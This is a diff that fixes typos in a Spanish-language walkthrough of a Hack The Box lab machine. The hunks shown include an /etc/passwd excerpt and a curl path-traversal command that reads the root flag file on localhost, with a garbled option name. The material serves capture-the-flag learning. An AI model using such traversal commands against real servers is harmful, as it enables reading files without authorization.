@@ -62,7 +62,7 @@ Hola a todos, hoy les presentaré la resolución de una máquina de **Hack The B
 
     Read data files from: /usr/bin/../share/nmap
     ```
-  ## Ahora accederemos a la web para poder determinar que clase de vulnerabilidades podemos encontrar
+  ## Ahora accederemos a la web para poder determinar que clase de vulnerabilidades que podemos encontrar
         
     Si escribimos en el navegador **http://10.10.11.38:5000/** nos encontraremos con esta sección.    
     ![Untitled](/assets/images/2024-11-24-chemistry-easy/Login.png)
@@ -284,7 +284,7 @@ Hola a todos, hoy les presentaré la resolución de una máquina de **Hack The B
     _laurel:x:997:997::/var/log/laurel:/bin/false
 
     ```
-    Si podems visualizar el etc/passwd o tambine podriamos visualizar la **flag** del root
+    Si podemos visualizar el etc/passwd tambine podriamos visualizar la **flag** del root
     
     ```python 
     curl -s --ruta- as-is http://localhost:8080/assets/../../../../root/root.txt
